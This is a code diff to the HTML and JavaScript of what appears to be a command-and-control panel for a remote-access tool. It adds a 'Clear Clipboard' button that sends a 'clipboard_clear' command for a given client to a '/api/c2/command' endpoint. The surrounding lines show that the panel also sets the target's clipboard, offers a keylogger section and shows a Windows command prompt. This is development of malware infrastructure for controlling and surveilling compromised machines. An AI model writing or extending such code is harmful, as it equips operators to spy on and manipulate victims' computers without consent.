@@ -838,7 +838,10 @@ C:\&gt;</div>
                     <textarea id="clipboard-set-input" rows="4" placeholder="Enter text to set on target clipboard..."
                         style="width:100%;background:var(--bg-raised);border:1px solid var(--border-color);border-radius:8px;padding:10px 12px;color:var(--text-primary);font-size:12px;font-family:var(--font-mono);resize:vertical;outline:none;box-sizing:border-box;transition:border-color 0.2s;"
                         onfocus="this.style.borderColor='rgba(196,154,60,0.35)'" onblur="this.style.borderColor='var(--border-color)'"></textarea>
-                    <button class="btn btn-primary" id="btn-clipboard-set" style="margin-top:10px;padding:7px 20px;font-size:12px;">Set Clipboard</button>
+                    <div style="display:flex;gap:8px;margin-top:10px;">
+                        <button class="btn btn-primary" id="btn-clipboard-set" style="padding:7px 20px;font-size:12px;">Set Clipboard</button>
+                        <button class="btn" id="btn-clipboard-clear" style="padding:7px 16px;font-size:12px;background:rgba(220,50,50,0.12);color:#e05c5c;border:1px solid rgba(220,50,50,0.25);">Clear Clipboard</button>
+                    </div>
                 </div>
             </div>
 
@@ -1215,6 +1218,17 @@ C:\&gt;</div>
                 btn.textContent = 'Sent!';
             } catch { btn.textContent = 'Error'; }
             setTimeout(() => { btn.textContent = 'Set Clipboard'; btn.disabled = false; }, 2000);
+        });
+
+        document.getElementById('btn-clipboard-clear').addEventListener('click', async () => {
+            const btn = document.getElementById('btn-clipboard-clear');
+            btn.textContent = 'Clearing...'; btn.disabled = true;
+            try {
+                await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ client_id: clientId, command: 'clipboard_clear' }) });
+                btn.textContent = 'Cleared!';
+            } catch { btn.textContent = 'Error'; }
+            setTimeout(() => { btn.textContent = 'Clear Clipboard'; btn.disabled = false; }, 2000);
         });
 
         // Keylogger
